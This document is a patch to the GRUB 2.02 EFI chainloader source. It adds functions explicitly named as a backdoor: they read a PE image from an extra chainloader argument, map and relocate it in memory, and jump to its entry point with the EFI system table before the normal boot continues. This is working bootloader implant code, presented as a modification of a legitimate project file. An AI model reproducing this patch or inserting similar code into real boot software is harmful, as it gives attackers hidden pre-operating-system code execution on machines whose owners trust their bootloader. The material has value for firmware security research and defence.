@@ -1,0 +1,279 @@
+--- grub-2.02_original/grub-core/loader/efi/chainloader.c	2017-04-24 02:15:49.000000000 -0700
++++ grub-2.02_patched/grub-core/loader/efi/chainloader.c	2020-04-19 03:51:23.000000000 -0700
+@@ -32,6 +32,7 @@
+ #include <grub/efi/api.h>
+ #include <grub/efi/efi.h>
+ #include <grub/efi/disk.h>
++#include <grub/efi/pe32.h>
+ #include <grub/command.h>
+ #include <grub/i18n.h>
+ #include <grub/net.h>
+@@ -50,6 +51,257 @@
+ static grub_efi_handle_t image_handle;
+ static grub_efi_char16_t *cmdline;
+ 
++#define GRUB_PE32_MAGIC 0x5a4d
++
++struct dos_header
++{
++  grub_uint16_t e_magic;
++  grub_uint16_t e_cblp;
++  grub_uint16_t e_cp;
++  grub_uint16_t e_crlc;
++  grub_uint16_t e_cparhdr;
++  grub_uint16_t e_minalloc;
++  grub_uint16_t e_maxalloc;
++  grub_uint16_t e_ss;
++  grub_uint16_t e_sp;
++  grub_uint16_t e_csum;
++  grub_uint16_t e_ip;
++  grub_uint16_t e_cs;
++  grub_uint16_t e_lfarlc;
++  grub_uint16_t e_ovno;
++  grub_uint16_t e_res[4];
++  grub_uint16_t e_oemid;
++  grub_uint16_t e_oeminfo;
++  grub_uint16_t e_res2[10];
++  grub_uint32_t e_lfanew;
++};
++
++struct nt_headers
++{
++  /* This is always PE\0\0.  */
++  char signature[GRUB_PE32_SIGNATURE_SIZE];
++
++  /* The COFF file header.  */
++  struct grub_pe32_coff_header coff_header;
++
++  /* The Optional header.  */
++  struct grub_pe64_optional_header optional_header;
++};
++
++static void backdoor_rellocate(grub_uint8_t *image, grub_addr_t base_new)
++{
++  struct dos_header *dos = NULL;
++  struct nt_headers *nt = NULL;
++  struct grub_pe32_fixup_block *block = NULL;
++  grub_uint32_t rel_rva = 0, rel_size = 0, size = 0;  
++  grub_addr_t base_old = 0;
++
++  // get headers
++  dos = (struct dos_header *)image;
++  nt = (struct nt_headers *)(image + dos->e_lfanew);
++
++  base_old = nt->optional_header.image_base;
++
++  rel_rva = nt->optional_header.base_relocation_table.rva;
++  rel_size = nt->optional_header.base_relocation_table.size;
++
++  if (rel_rva == 0 || rel_size == 0)
++  {
++    grub_printf("Relocation table is not present\n");
++    return;
++  }
++
++  grub_printf(
++    "Relocation table is at 0x%x (%d bytes)\n", 
++    rel_rva, rel_size
++  );
++
++  block = (struct grub_pe32_fixup_block *)(image + rel_rva);
++
++  // enumerate relocation table blocks
++  while (rel_size > size && block->block_size != 0)
++  {            
++    grub_uint32_t i = 0;
++    grub_uint32_t cnt = (block->block_size -
++      sizeof(struct grub_pe32_fixup_block)) / sizeof(grub_uint16_t);
++
++    // brocess block
++    for (i = 0; i < cnt; i++)
++    {
++      grub_uint16_t entry = block->entries[i];
++
++      if (entry != 0)
++      {
++        // brocess block entry
++        grub_uint16_t type = (entry & 0xf000) >> 12;
++        grub_uint8_t *addr = (image + block->page_rva + (entry & 0x0fff));
++
++        if (type == GRUB_PE32_REL_BASED_DIR64)
++        {                        
++          *(grub_uint64_t *)addr += (grub_uint64_t)(base_new - base_old);
++        }                    
++        else if (type == GRUB_PE32_REL_BASED_HIGHLOW)
++        {
++          *(grub_uint32_t *)addr += (grub_uint32_t)(base_new - base_old);
++        }
++        else
++        {
++          // unknown relocation type
++        }
++      }
++    }
++
++    // go to the next block
++    block = (struct grub_pe32_fixup_block *)((grub_uint8_t *)block + block->block_size);
++    size += block->block_size;
++  }
++}
++
++static grub_err_t backdoor_load(const char *path)
++{
++  grub_file_t file = 0;
++  grub_ssize_t size = 0;
++  grub_uint16_t i = 0;
++  grub_efi_status_t status = GRUB_EFI_SUCCESS;
++  grub_efi_physical_address_t data_address = 0, image_address = 0;
++  grub_efi_uintn_t data_pages = 0, image_pages = 0;
++  grub_uint8_t *data = NULL, *image = NULL;
++  void *entry_point = NULL;
++  struct dos_header *dos = NULL;
++  struct nt_headers *nt = NULL;
++  struct grub_pe32_section_table *section = NULL;
++
++  // open target file
++  if ((file = grub_file_open(path)) == 0)
++  {
++    grub_printf("Failed to open backdoor image\n");
++    goto fail;
++  }
++
++  if ((size = grub_file_size(file)) == 0)
++  {
++    grub_printf("Invalid backdoor image size\n");
++    goto fail;
++  }
++
++  // number of pages to allocate
++  data_pages = (((grub_efi_uintn_t)size + ((1 << 12) - 1)) >> 12);
++  
++  // allocate memory for image data
++  status = efi_call_4(
++    grub_efi_system_table->boot_services->allocate_pages, 
++    GRUB_EFI_ALLOCATE_ANY_PAGES, GRUB_EFI_LOADER_CODE, data_pages, &data_address
++  );
++  if (status != GRUB_EFI_SUCCESS)
++  {
++    grub_printf("Failed to allocate backdoor image memory\n");
++    goto fail;
++  }
++
++  data = (grub_uint8_t *)((grub_addr_t)data_address);
++
++  // read image contents
++  if (grub_file_read(file, data, size) != size)
++  {
++    grub_printf("Failed to read backdoor image\n");
++    goto fail;
++  }
++
++  // get DOS header
++  dos = (struct dos_header *)data;
++  if (dos->e_magic != GRUB_PE32_MAGIC)
++  {
++    grub_printf("Bad DOS header signature\n");
++    goto fail;
++  }
++
++  // get NT header
++  nt = (struct nt_headers *)(data + dos->e_lfanew);
++  if (nt->optional_header.magic != GRUB_PE32_PE64_MAGIC)
++  {
++    grub_printf("Bad optional header signature\n");
++    goto fail; 
++  }
++
++  section = (struct grub_pe32_section_table *)(
++    (grub_uint8_t *)&nt->optional_header + nt->coff_header.optional_header_size);
++
++  grub_printf(
++    "Backdoor image size is 0x%x bytes\n", 
++    nt->optional_header.image_size
++  );
++
++  // number of pages to allocate
++  image_pages = (((grub_efi_uintn_t)nt->optional_header.image_size + ((1 << 12) - 1)) >> 12);
++  
++  // allocate memory for image data
++  status = efi_call_4(
++    grub_efi_system_table->boot_services->allocate_pages, 
++    GRUB_EFI_ALLOCATE_ANY_PAGES, GRUB_EFI_LOADER_CODE, image_pages, &image_address
++  );
++  if (status != GRUB_EFI_SUCCESS)
++  {
++    grub_printf("Failed to allocate backdoor image memory\n");
++    goto fail;
++  }
++
++  image = (grub_uint8_t *)((grub_addr_t)image_address);
++
++  // copy headers
++  grub_memset(image, 0, nt->optional_header.image_size);
++  grub_memcpy(image, data, nt->optional_header.header_size);
++
++  for (i = 0; i < nt->coff_header.num_sections; i++, section++)
++  {
++    // copy section
++    grub_memcpy(
++      image + section->virtual_address, data + section->raw_data_offset,
++      section->raw_data_size
++    );
++  }
++
++  // relocate image
++  backdoor_rellocate(image, (grub_addr_t)image_address);
++
++  // get entry point address
++  entry_point = image + nt->optional_header.entry_addr;
++
++  grub_printf(
++    "Backdoor image entry point at 0x%x\n", 
++    nt->optional_header.entry_addr
++  );
++
++  // call backdoor image entry point
++  __asm__ __volatile__ (
++    "xor    %%rcx, %%rcx\n"
++    "mov    %0, %%rdx\n"
++    "mov    %1, %%rax\n"
++    "sub    $32, %%rsp\n"
++    "call   %%rax\n"
++    "add    $32, %%rsp\n"
++    : /* no output */
++    : "m" (grub_efi_system_table), "m" (entry_point)
++    : "%rcx", "%rdx", "%rax"
++  );
++
++fail:
++
++  if (file != 0)
++  {
++    grub_file_close(file);
++  }
++
++  if (data_address != 0)
++  {
++    efi_call_2(
++      grub_efi_system_table->boot_services->free_pages, 
++      data_address, data_pages
++    );
++  }
++
++  return grub_errno;
++}
++
+ static grub_err_t
+ grub_chainloader_unload (void)
+ {
+@@ -212,6 +464,10 @@
+ 
+   grub_dl_ref (my_mod);
+ 
++  if (argc > 1)
++    /* Load EFI backdoor */
++    backdoor_load (argv[1]);
++
+   /* Initialize some global variables.  */
+   address = 0;
+   image_handle = 0;
